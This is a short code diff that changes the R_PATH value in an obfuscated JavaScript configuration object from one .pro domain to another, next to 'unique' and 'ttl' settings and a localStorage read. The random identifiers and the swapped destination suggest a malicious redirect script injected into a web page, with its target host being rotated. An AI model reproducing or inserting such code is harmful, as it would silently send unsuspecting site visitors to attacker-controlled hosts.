@@ -14,7 +14,7 @@
         window._d6mqLn9yCtp9ry3F = {
             unique: false,
             ttl: 86400,
-            R_PATH: 'https://kryzinta.pro/tFdSRwqv',
+            R_PATH: 'https://mivronix.pro/tFdSRwqv',
         };
     }
     const _Bhbq5p8XGGhLbwwr = localStorage.getItem('config');
